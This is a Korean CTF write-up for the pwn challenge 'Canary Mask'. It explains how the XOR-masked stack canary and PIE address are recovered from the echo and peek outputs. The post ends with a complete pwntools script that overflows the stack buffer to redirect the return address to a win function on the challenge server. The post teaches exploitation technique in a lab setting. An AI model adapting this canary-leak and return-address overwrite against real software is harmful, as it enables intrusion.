---
title: "Canary Mask"
date: 2026-11-01 00:00:00 +0900
categories: [CTF/Wargame]
tags: [pwn, Canary, PIE, Buffer Overflow]
description: "XOR로 마스킹된 스택 카나리와 PIE 주소를 복구하고, 버퍼 오버플로로 win 함수에 도달하는 풀이"
---

풀면서 컴퓨터 앞에 앉아 있던 시간만 20시간이 훌쩍 넘었다. 풀이를 적으면서 나도 다시 공부할 겸, 취약한 C 코드와 익스플로잇을 번갈아 보며 정리한다.

## 문제 개요

이 문제에는 스택 카나리와 PIE가 적용되어 있다. 프로그램은 메뉴를 반복해서 보여 주며, 핵심 기능은 다음과 같다.

1. **write**: 입력을 전역 버퍼 `tmp`에 읽은 뒤, 카나리 바이트와 XOR해 스택 버퍼 `buf`에 저장한다.
2. **echo**: `buf`를 카나리의 다음 바이트와 XOR한 값을 16진수로 출력한다.
3. **peek**: `buf`를 `main` 주소의 바이트와 XOR한 값을 출력한다.
4. **exit**: `vuln()`에서 반환한다.

`buf`는 64바이트지만 입력 길이는 최대 200바이트까지 허용된다. 따라서 `write`에서 길이를 크게 주면 스택 버퍼를 넘어 쓸 수 있다. 다만 저장할 때 XOR가 적용되므로, 카나리와 PIE 주소를 먼저 복구해야 한다.

## 카나리 복구

`write`는 각 입력 바이트를 카나리 바이트와 XOR해 `buf`에 넣는다.

```c
int got = (int)fread(tmp, 1, (size_t)n, stdin);
long canary = *(long*)((char*)__builtin_frame_address(0) - 8);
unsigned char *k = (unsigned char*)&canary;

for (int i = 0; i < got; i++) {
    buf[i] = tmp[i] ^ k[i % 8];
}
```

`echo`는 저장된 바이트를 카나리의 다음 바이트와 다시 XOR해 출력한다.

```c
for (int i = 0; i < 64; i++) {
    if (buf[i] == 0) break;
    printf("%02hhx", (unsigned char)buf[i] ^ k[(i + 1) % 8]);
}
```

입력 바이트를 `tmp[i]`, 카나리 바이트를 `canary[i]`, `echo`에서 받은 바이트를 `b[i]`라고 하면 다음 관계가 성립한다.

```text
b[i] = tmp[i] ^ canary[i] ^ canary[i + 1]
```

x86_64 스택 카나리의 가장 낮은 바이트는 `0x00`이므로, 이를 시작점으로 다음 바이트를 차례대로 구할 수 있다.

```python
p.sendlineafter(b'> ', b'2')
a = p.recvn(16)
b = [int(a[i:i + 2], 16) for i in range(0, len(a), 2)]

canary = [0] * 8
canary[0] = 0x00
for i in range(1, 8):
    canary[i] = b[i - 1] ^ tmp[i - 1] ^ canary[i - 1]

c = u64(bytes(canary))
```

여기서는 첫 입력으로 `tmp = b'00000000'`을 사용한다. `echo` 출력의 두 자리 16진수를 바이트 단위로 변환한 뒤, 앞서 구한 카나리 바이트를 이용해 다음 바이트를 복원한다.

## PIE 주소 복구

`peek`는 `buf[idx + i]`와 `main` 주소의 각 바이트를 XOR해 출력한다.

```c
long key = (long)&main;
unsigned char *k2 = (unsigned char*)&key;
for (int i = 0; i < n; i++) {
    printf("%02hhx", (unsigned char)buf[idx + i] ^ k2[i % 8]);
}
```

`idx`를 `0`, 길이를 `8`로 지정하면 다음 식을 이용해 `main`의 런타임 주소를 복원할 수 있다.

```text
peek[i] = tmp[i] ^ canary[i] ^ main[i]
main[i] = peek[i] ^ canary[i] ^ tmp[i]
```

```python
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b'? ', b'8')
pie = p.recvn(16)
s = [int(pie[i:i + 2], 16) for i in range(0, len(pie), 2)]

main_bytes = [0] * 8
for i in range(8):
    main_bytes[i] = s[i] ^ canary[i] ^ tmp[i]

main_addr = u64(bytes(main_bytes))
win_addr = main_addr + 0x12c9 - 0x170d
```

`0x170d`는 `main`, `0x12c9`는 `win`의 바이너리 내 오프셋이다. PIE 베이스가 적용된 `main` 주소에 두 오프셋의 차이를 더해 `win` 주소를 구한다.

## 반환 주소 덮어쓰기

`buf`부터 저장된 카나리까지의 오프셋은 72바이트다. 카나리를 보존하고 저장된 반환 주소를 `win`으로 바꾸는 페이로드를 만든다.

```python
payload = b'a' * 72 + p64(c) + b'a' * 8 + p64(win_addr)
```

`write`가 입력을 카나리와 XOR하므로, 페이로드도 카나리 바이트와 미리 XOR해 보낸다. 그러면 프로그램이 다시 XOR했을 때 스택에는 원래 의도한 페이로드가 들어간다.

```python
encoded = bytes(payload[i] ^ canary[i % 8] for i in range(len(payload)))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'? ', str(len(encoded)).encode())
p.sendline(encoded)
p.sendline(b'4')
p.interactive()
```

## 전체 익스플로잇

```python
from pwn import *

# p = process('./vuln')
p = remote('s-f.site', 10021)

# 알려진 바이트를 넣어 카나리 XOR 결과를 관찰한다.
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'? ', b'8')
tmp = b'00000000'
p.sendline(tmp)

# echo 출력에서 스택 카나리를 복구한다.
p.sendlineafter(b'> ', b'2')
a = p.recvn(16)
b = [int(a[i:i + 2], 16) for i in range(0, len(a), 2)]

canary = [0] * 8
canary[0] = 0x00
for i in range(1, 8):
    canary[i] = b[i - 1] ^ tmp[i - 1] ^ canary[i - 1]
c = u64(bytes(canary))

# peek 출력에서 PIE가 적용된 main 주소를 복구한다.
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b'? ', b'8')
pie = p.recvn(16)
s = [int(pie[i:i + 2], 16) for i in range(0, len(pie), 2)]

main_bytes = [0] * 8
for i in range(8):
    main_bytes[i] = s[i] ^ canary[i] ^ tmp[i]
main_addr = u64(bytes(main_bytes))
win_addr = main_addr + 0x12c9 - 0x170d

# 카나리를 보존하고 반환 주소를 win으로 바꾼다.
payload = b'a' * 72 + p64(c) + b'a' * 8 + p64(win_addr)
encoded = bytes(payload[i] ^ canary[i % 8] for i in range(len(payload)))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'? ', str(len(encoded)).encode())
p.sendline(encoded)
p.sendline(b'4')
p.interactive()
```

핵심은 `echo`의 인접 카나리 바이트 XOR 관계로 카나리를 복원하고, `peek`의 카나리/XOR 관계를 되돌려 PIE 주소를 얻는 것이다. 마지막에는 원하는 스택 내용을 입력 전에 같은 카나리로 XOR해 인코딩해 두어, 프로그램의 XOR를 통과한 뒤 정상 페이로드가 스택에 놓이도록 한다.

원문: [Canary Mask 풀이 노트](https://sepia-lungfish-c25.notion.site/Canary-Mask-36e1898cf91e80449f89ddd8cb756582)
